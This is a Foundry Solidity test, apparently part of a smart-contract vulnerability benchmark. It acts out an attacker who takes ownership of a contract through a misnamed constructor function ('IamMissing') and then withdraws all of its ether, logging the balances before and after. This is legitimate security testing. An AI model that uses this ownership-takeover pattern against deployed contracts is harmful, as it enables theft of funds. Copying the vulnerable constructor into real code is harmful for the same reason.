// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/incorrect_constructor_name1.sol";

contract MissingTest is Test {
    Missing public missing;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(owner);
        missing = new Missing();
        vm.deal(address(missing), 1 ether);
    }

    function test_AttackerCanWithdrawAfterTakingOwnership() public {
        // Context logging
        console.log("--- Context: Contract deployed and funded ---");
        console.log("Contract balance: %s", address(missing).balance);
        console.log("Attacker balance: %s", attacker.balance);

        // Attacker claims ownership
        console.log("--- Trigger: Attacker claims ownership by calling IamMissing ---");
        vm.prank(attacker);
        missing.IamMissing();

        // Pre-withdraw state
        console.log("--- BEFORE-Trigger Withdraw ---");
        uint256 preWithdrawContractBalance = address(missing).balance;
        uint256 preWithdrawAttackerBalance = attacker.balance;
        console.log("Contract balance (pre-withdraw): %s", preWithdrawContractBalance);
        console.log("Attacker balance (pre-withdraw): %s", preWithdrawAttackerBalance);

        // Trigger: withdraw
        console.log("--- Trigger Withdraw ---");
        vm.prank(attacker);
        missing.withdraw();

        // Post-withdraw state
        console.log("--- AFTER-Trigger Withdraw ---");
        uint256 postWithdrawContractBalance = address(missing).balance;
        uint256 postWithdrawAttackerBalance = attacker.balance;
        console.log("Contract balance (post-withdraw): %s", postWithdrawContractBalance);
        console.log("Attacker balance (post-withdraw): %s", postWithdrawAttackerBalance);

        // Calculate changes and compare
        uint256 contractDiff = preWithdrawContractBalance - postWithdrawContractBalance;
        uint256 attackerDiff = postWithdrawAttackerBalance - preWithdrawAttackerBalance;
        bool balancesChanged = (contractDiff == attackerDiff) && (contractDiff > 0);
        bool contractEmptied = (postWithdrawContractBalance == 0);
        bool vulnerabilityExists = balancesChanged && contractEmptied;

        console.log("Change in contract balance: %s", contractDiff);
        console.log("Change in attacker balance: %s", attackerDiff);
        console.log("Withdraw successful: %s", vulnerabilityExists ? "YES" : "NO");

        // Final verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Attacker could withdraw funds after taking ownership");
        } else {
            console.log("Vulnerability not Exist: Attack failed to withdraw funds");
        }
    }
}